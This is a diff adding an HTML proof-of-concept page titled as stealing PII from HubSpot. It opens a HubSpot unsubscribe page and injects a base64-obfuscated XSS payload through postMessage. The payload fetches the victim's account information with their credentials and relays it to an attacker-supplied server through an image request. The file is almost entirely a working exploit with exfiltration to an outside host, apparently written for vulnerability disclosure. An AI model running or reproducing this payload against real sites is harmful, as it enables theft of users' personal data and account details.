@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+    <title>Hupspot stealing PII POC</title>
+  </head>
+  <body>
+    <script>
+      let win = window.open(
+        "https://hs-6069836.s.hubspotemail.net/hs/manage-preferences/unsubscribe-all"
+      );
+      setTimeout(() => {
+        poc(win);
+      }, 5000);
+
+      function poc(win) {
+        let fetchPII = `<img src=x onerror="eval(atob('dmFyIFBJSTsKLy8gZmV0Y2hpbmcgdmljdGltIHVzZXIgUElJIGluZm8gZnJvbSBodHRwczovL2FwcC1ldTEuaHVic3BvdC5jb20vYXBpL2xvZ2luLXZlcmlmeS91c2VyLWluZm8KZmV0Y2goJ2h0dHBzOi8vYXBwLWV1MS5odWJzcG90LmNvbS9hcGkvbG9naW4tdmVyaWZ5L3VzZXItaW5mbycse21ldGhvZDonZ2V0JyxjcmVkZW50aWFsczogJ2luY2x1ZGUnLCAgaGVhZGVyczp7J0NvbnRlbnQtVHlwZSc6J2FwcGxpY2F0aW9uL2pzb24nfX0pCiAgLnRoZW4oKHJlc3BvbnNlKSA9PiByZXNwb25zZS5qc29uKCkpCiAgLnRoZW4oKHgpID0+IHsKICAgIFBJSSA9IEpTT04uc3RyaW5naWZ5KHgpOwogICAgd2luZG93Lm9wZW5lci5wb3N0TWVzc2FnZShQSUksICIqIik7IC8vIHNlbmQgdmljdGltIHVzZXIgUElJIGluZm8gdG8gcGFyZW50IHdpbmRvdyAoIGF0dGFja2VyIHdlYiBwYWdlIHdpbmRvdyApCiAgIAogICAgfSk7CiAgICA='))" >`;
+
+        msg = {
+          type: "hsFormCallback",
+          id: fetchPII,
+        };
+        win.postMessage(msg, "*");
+      }
+
+      window.addEventListener("message", function (msg) {
+        // when recive user PII info send it to attacker server
+
+        let ATTACKER_SERVER = new URLSearchParams(location.search).get("url");
+
+        new Image().src =
+          ATTACKER_SERVER +
+          "?victimPII=" + // add here your controlable server to send victim PII info to it
+          msg.data;
+      });
+    </script>
+  </body>
+</html>
